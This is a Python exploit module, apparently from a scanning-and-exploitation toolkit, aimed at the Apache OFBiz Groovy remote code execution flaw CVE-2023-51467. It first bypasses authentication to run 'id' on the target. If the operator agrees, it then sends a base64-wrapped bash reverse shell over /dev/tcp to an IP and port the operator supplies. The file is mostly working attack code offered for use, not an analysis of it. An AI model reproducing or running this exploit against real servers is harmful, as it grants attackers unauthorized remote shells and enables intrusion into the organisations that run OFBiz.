#!/user/bin/env python3
# -*- coding: utf-8 -*-
import urllib3,requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
from rich.prompt import Prompt
urllib3.disable_warnings()
class Cve_2023_51467:
    def run(self,url):
        base_url = url + "/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y"
        try:
            data = "groovyProgram=throw+new+Exception('id'.execute().text);"
            header = {
                "Host": url.split("://")[-1],
                "User-Agent":self.headers,
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            response = requests.post(base_url, headers=header, verify=self.ssl, proxies=self.proxy, data=data)
            if "uid=" in response.text:
                OutPrintInfoSuc("Apache", f"目标存在漏洞:{base_url}")
                if self.batch:
                    OutPutFile("apache_ofbiz_groovy_rce.txt",f"目标存在漏洞: {base_url}")

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Apache", "目标不存在Apache OFBiz groovy远程代码执行漏洞")
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("Apache", "目标请求出错")
                return False
    def run2(self,url,nc):
        base_url = url + "/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y"
        try:
            header = {
                "Host": url.split("://")[-1],
                "User-Agent":self.headers,
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            data = f"groovyProgram='{nc}'.execute();"
            response = requests.post(base_url, headers=header, verify=self.ssl, proxies=self.proxy, data=data)
            if response.status_code == 200:
                OutPrintInfoSuc("Apache", f"执行成功")
                return True
            else:
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("Apache", "目标请求出错")
                return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.headers = target["header"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)

        if not self.batch:
            OutPrintInfo("Apache", f"开始检测Apache OFBiz groovy远程代码执行漏洞...")
        if self.run(url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否进行漏洞利用([b red]y/n[/b red])")
                if choose == "y":
                    import base64
                    ip = Prompt.ask("[b yellow]输入转发IP地址")
                    port = Prompt.ask("[b yellow]输入监听端口地址")
                    nc_adr = f"bash%20-i%20>&%20/dev/tcp/{ip}/{port}%200>&1"
                    nc = base64.b64encode(nc_adr.encode()).decode()
                    if not ip or not port:
                        OutPrintInfo("Apache", "未检测到IP或端口输入信息")
                        return
                    res_nc = 'bash+-c+{echo,'+nc+'}|{base64,-d}|{bash,-i}'
                    self.run2(url,res_nc)
        if not self.batch:
            OutPrintInfo("Apache", f"Apache OFBiz groovy远程代码执行漏洞检测结束")

